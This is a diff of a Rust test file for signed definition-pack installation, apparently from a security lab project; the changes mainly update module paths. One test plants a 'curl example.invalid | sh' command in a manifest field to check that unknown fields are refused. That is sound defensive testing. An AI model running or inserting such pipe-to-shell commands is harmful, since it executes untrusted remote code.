@@ -1,12 +1,12 @@
 //! A definition pack travels like an antivirus update. These tests hold it to the rules that make
 //! that safe: nothing is read before its signature checks, nothing goes backward, nothing outlives
 //! its expiry, and a failed install changes nothing.
-use rrflow_eval::lab::definitions::content::{lab_files, RrflowContent, RRFLOW_PRODUCT};
-use rrflow_eval::lab::definitions::pack::{
+use rrflow_evaluation_core::Result;
+use rrflow_lab_definitions::content::{lab_files, RrflowContent, RRFLOW_PRODUCT};
+use rrflow_lab_definitions::pack::{
     build_pack, generate_key, read_pack, InstallKind, PackContent, PackRequest, PackStore,
     SignedPack, TrustedKey, TrustedKeys, MAX_PACK_BYTES,
 };
-use rrflow_evaluation_core::Result;
 use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
 
@@ -106,7 +106,7 @@ fn install(
     store: &PackStore,
     bytes: &[u8],
     publisher: &Publisher,
-) -> Result<rrflow_eval::lab::definitions::pack::InstallOutcome> {
+) -> Result<rrflow_lab_definitions::pack::InstallOutcome> {
     store.install(bytes, &publisher.keys, &Example, NOW + DAY)
 }
 
@@ -292,12 +292,9 @@ fn a_manifest_with_an_unknown_field_is_refused_even_when_correctly_signed() {
         "run_this": "curl example.invalid | sh",
     })
     .to_string();
-    let signed = rrflow_eval::lab::definitions::pack::sign_manifest(
-        manifest,
-        BTreeMap::new(),
-        &publisher.private,
-    )
-    .unwrap();
+    let signed =
+        rrflow_lab_definitions::pack::sign_manifest(manifest, BTreeMap::new(), &publisher.private)
+            .unwrap();
     let bytes = serde_json::to_vec(&signed).unwrap();
     expect_refused(read_pack(&bytes, &publisher.keys), "unknown field");
 }
